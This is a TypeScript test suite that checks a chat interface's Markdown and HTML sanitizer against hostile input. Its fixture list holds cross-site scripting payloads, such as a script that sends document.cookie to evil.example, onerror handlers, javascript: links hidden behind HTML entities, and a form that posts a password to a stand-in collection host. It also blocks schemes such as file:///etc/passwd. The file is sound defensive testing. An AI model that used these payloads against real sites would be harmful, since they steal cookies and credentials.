// The chat's real rendering chain (the installed Streamdown's own plugins, as components/chat/Markdown wires
// them), fed what a model or a quoted third party may write. What reaches the DOM is read off the tree.
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import remarkGfm from "remark-gfm";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import { defaultRehypePlugins } from "streamdown";
import { unified, type Pluggable } from "unified";

import { externalImagesAsLinks, ownLink, strictSchema, type SanitizeSchema } from "./markdown-safety.ts";

interface El { type: string; tagName?: string; properties?: Record<string, unknown>; children?: El[]; value?: string }

const [sanitize, schema] = defaultRehypePlugins.sanitize as [Pluggable, SanitizeSchema];
const chain = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use([defaultRehypePlugins.raw, [sanitize, strictSchema(schema)], externalImagesAsLinks, defaultRehypePlugins.harden] as Pluggable[]);
const render = (md: string): El[] => {
  const out: El[] = [];
  const walk = (n: El) => {
    if (n.type === "element") out.push(n);
    n.children?.forEach(walk);
  };
  walk(chain.runSync(chain.parse(md)) as El);
  return out;
};
const tags = (md: string) => render(md).map((e) => e.tagName);
const text = (md: string) => JSON.stringify(chain.runSync(chain.parse(md)));

// Every tag the chain may emit, and every attribute on it: a hostile input never widens either.
const TAGS = new Set(["a", "b", "blockquote", "br", "code", "dd", "del", "details", "div", "dl", "dt", "em", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "img", "input", "ins", "kbd", "li", "ol", "p", "pre", "q", "rp", "rt", "ruby", "s", "samp", "section", "span", "strike", "strong", "sub", "summary", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "tr", "tt", "ul", "var"]);
const LOADS = ["src", "srcSet", "srcset", "poster", "background", "data", "action", "formAction", "srcDoc", "srcdoc", "style", "ping", "longDesc", "xLinkHref", "manifest", "code", "codeBase", "archive", "profile", "icon", "lowsrc", "dynsrc"];

const HOSTILE: [string, string][] = [
  ["script", `<script>fetch("https://evil.example/"+document.cookie)</script>`],
  ["script in a block", `texte\n\n<div><script src="https://evil.example/x.js"></script></div>`],
  ["img onerror", `<img src=x onerror=alert(1)>`],
  ["iframe + srcdoc", `<iframe src="https://evil.example" srcdoc="<script>parent.x=1</script>"></iframe>`],
  ["form", `<form action="https://evil.example/collect" method="post"><input name="mot-de-passe" type="password"><button formaction="https://evil.example">Valider</button></form>`],
  ["style tag", `<style>body{background:url(https://evil.example/x)} a[href^=h]{color:red}</style>`],
  ["style attribute", `<p style="background:url(https://evil.example/s);position:fixed;inset:0">x</p>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.example/c.css">`],
  ["base", `<base href="https://evil.example/">`],
  ["a target + onclick", `<a href="https://evil.example" target="_top" onclick="x()" ping="https://evil.example/p">l</a>`],
  ["picture source", `<picture><source srcset="https://evil.example/pic?d=secret"><img src="/ok.png"></picture>`],
  ["img srcset", `<img src="/ok.png" srcset="https://evil.example/s 2x" longdesc="https://evil.example/ld">`],
  ["svg", `<svg onload=alert(1)><image href="https://evil.example/i"/><use href="https://evil.example/u#x"/><a xlink:href="javascript:alert(1)">x</a></svg>`],
  ["math", `<math><maction actiontype="statusline#http://evil.example">x</maction></math>`],
  ["object embed", `<object data="https://evil.example/o"></object><embed src="https://evil.example/e">`],
  ["video audio track", `<video src="https://evil.example/v" poster="https://evil.example/p" autoplay><track src="https://evil.example/t"></video><audio src="https://evil.example/a"></audio>`],
  ["details ontoggle", `<details open ontoggle=alert(1)><summary>s</summary>d</details>`],
  ["overlay classes", `<div id="root" name="config" class="fixed inset-0 z-50">x</div>`],
  ["input autofocus", `<input type="text" value="x" autofocus onfocus=alert(1)>`],
  ["input image", `<input type="image" src="https://evil.example/ii">`],
  ["table background", `<table background="https://evil.example/bg"><tr><td background="https://evil.example/td">x</td></tr></table>`],
  ["body", `<body background="https://evil.example/b" onload=alert(1)>`],
  ["map area", `<img src="/ok.png" usemap="#m"><map name=m><area href="https://evil.example/a" shape=rect coords="0,0,9,9"></map>`],
  ["marquee noscript template", `<marquee onstart=alert(1)>m</marquee><noscript><img src="https://evil.example/n"></noscript><template><img src="https://evil.example/t"></template>`],
  ["markdown image", `![x](https://evil.example/md?d=1) ![y](//evil.example/pr) ![z](data:image/svg+xml;base64,PHN2Zz4=)`],
  ["html in a table cell", `| a |\n|---|\n| <img src="https://evil.example/c" onerror=alert(1)> |`],
  ["html after a list", `- un\n- <iframe src="https://evil.example"></iframe>\n\n<SCRIPT>alert(1)</SCRIPT>`],
  ["mixed-case and split", `<ScRiPt>alert(1)</sCrIpT><img/src="https://evil.example/q"/onerror=alert(1)>`],
  ["entities", `<a href="jav&#x61;script:alert(1)">e</a><a href="&#106;avascript:alert(1)">f</a>`],
];

describe("🔒 rendu du chat : HTML et Markdown hostiles", () => {
  for (const [name, md] of HOSTILE) {
    it(`${name} : rien hors de la liste blanche, aucun gestionnaire, aucune adresse chargée`, () => {
      for (const el of render(md)) {
        assert.ok(TAGS.has(el.tagName ?? ""), `tag ${el.tagName}`);
        for (const [key, value] of Object.entries(el.properties ?? {})) {
          assert.ok(!/^on/i.test(key), `handler ${key}`);
          if (el.tagName === "img" && key === "src") assert.match(String(value), /^\/(?!\/)/, "a picture that stays is ours");
          else assert.ok(!LOADS.includes(key), `${el.tagName}.${key}`);
          if (key === "target") assert.equal(value, "_blank");
        }
      }
      assert.ok(!/javascript:|vbscript:|data:text/i.test(text(md).replace(/"value":"[^"]*"/g, "")), "no script address outside plain text");
    });
  }

  it("un lien ne garde que http(s), mailto, tel ; tout autre schéma n'est plus un lien", () => {
    const hrefs = (md: string) => render(md).filter((e) => e.tagName === "a").map((e) => e.properties?.href);
    assert.deepEqual(hrefs(`[a](https://exemple.com/x) [b](mailto:a@exemple.com) <a href="tel:+2250700000000">c</a> [d](/livrables/ouvrir?p=x)`), ["https://exemple.com/x", "mailto:a@exemple.com", "tel:+2250700000000", "/livrables/ouvrir?p=x"]);
    for (const bad of ["javascript:alert(1)", "data:text/html,x", "vbscript:x", "irc://x", "xmpp:x@y", "file:///etc/passwd", "intent://x#Intent;end", "ms-msdt:x"]) {
      assert.deepEqual(hrefs(`<a href="${bad}">x</a>`), [], bad);
    }
    for (const a of render(`[a](https://exemple.com)`).filter((e) => e.tagName === "a")) assert.match(String(a.properties?.rel), /noopener/);
  });

  it("une image distante n'est jamais chargée, même glissée dans <picture> ; la nôtre s'affiche", () => {
    assert.deepEqual(tags(`<picture><source srcset="https://evil.example/p"><img src="/api/a.png"></picture>`).filter((t) => t !== "p"), ["img"]);
    assert.ok(!text(`<picture><source srcset="https://evil.example/p"><img src="/api/a.png"></picture>`).includes("evil.example"));
    const remote = render(`![rapport](https://evil.example/px?d=secret)`);
    assert.ok(!remote.some((e) => e.tagName === "img"));
    assert.equal(remote.find((e) => e.tagName === "a")?.properties?.href, "https://evil.example/px?d=secret");
  });

  it("ce que les Experts écrivent tous les jours sort inchangé", () => {
    assert.deepEqual(tags("## Titre\n\n**gras** et `code`\n\n- [x] fait\n- [ ] à faire\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n> cité\n\n```js\nlet a = 1;\n```\n\n<details><summary>plus</summary>texte</details>\n\nH<sub>2</sub>O"),
      ["h2", "p", "strong", "code", "ul", "li", "input", "li", "input", "table", "thead", "tr", "th", "th", "tbody", "tr", "td", "td", "blockquote", "p", "pre", "code", "details", "summary", "p", "sub"]);
    const cells = render("| a | b |\n|:--|--:|\n| 1 | 2 |").filter((e) => e.tagName === "td").map((e) => e.properties?.align);
    assert.deepEqual(cells, ["left", "right"]);
    assert.equal(render("```js\nx\n```").find((e) => e.tagName === "code")?.properties?.className?.toString(), "language-js");
  });

  it("la liste blanche ne fait que perdre des entrées", () => {
    const strict = strictSchema(schema);
    for (const t of strict.tagNames ?? []) assert.ok(schema.tagNames?.includes(t));
    for (const t of ["picture", "source", "script", "iframe", "form", "style", "meta", "link", "base", "object", "embed", "svg", "math", "video", "audio", "button", "textarea", "select"]) assert.ok(!strict.tagNames?.includes(t), t);
    const names = Object.values(strict.attributes ?? {}).flat().map((a) => (typeof a === "string" ? a : a[0]));
    for (const a of ["style", "srcSet", "srcDoc", "action", "formAction", "target", "ping", "onClick", "onerror", "longDesc", "name", "value", "useMap"]) assert.ok(!names.includes(a), a);
    assert.deepEqual(strict.protocols?.href, ["http", "https", "mailto", "tel"]);
  });

  it("seul un chemin du site s'ouvre sans demander ; //hôte et /\\hôte sont d'autres sites", () => {
    for (const own of ["/livrables/ouvrir?p=x", "/api/agents/a/files/content?path=b"]) assert.equal(ownLink(own), true);
    for (const other of ["//evil.example/x", "/\\evil.example", "https://evil.example", "mailto:a@b.c", ""]) assert.equal(ownLink(other), false, other);
  });
});
